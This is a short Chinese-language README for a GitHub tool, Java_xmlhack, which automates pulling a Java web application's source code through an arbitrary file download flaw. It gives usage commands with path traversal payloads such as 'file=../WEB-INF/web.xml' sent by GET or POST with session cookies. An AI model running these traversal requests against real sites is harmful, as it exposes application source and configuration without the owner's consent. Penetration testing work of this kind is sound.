# Java_xmlhack
帮助java环境下任意文件下载情况自动化读取源码的小工具

## 想法

[关于Java任意文件读取的学习](https://art3mis.top/2019/04/04/%e5%85%b3%e4%ba%8ejava%e7%9a%84%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96/)

## 使用
```bash
git clone https://github.com/Artemis1029/Java_xmlhack.git
cd Java_xmlhack
# if get
python xmlsearch.py -u https://xxx.xxx/?file=../WEB-INF/web.xml -c="cookie"
# if post
python xmlsearch.py -u https://xxx.xxx/ -d="file=../WEB-INF/web.xml" -t="content-type(default application/x-www-form-urlencoded)" -c="cookie"
```
![1](https://i.loli.net/2019/04/05/5ca728049a7fb.jpg)

![2](https://i.loli.net/2019/04/05/5ca7283ee522d.jpg)
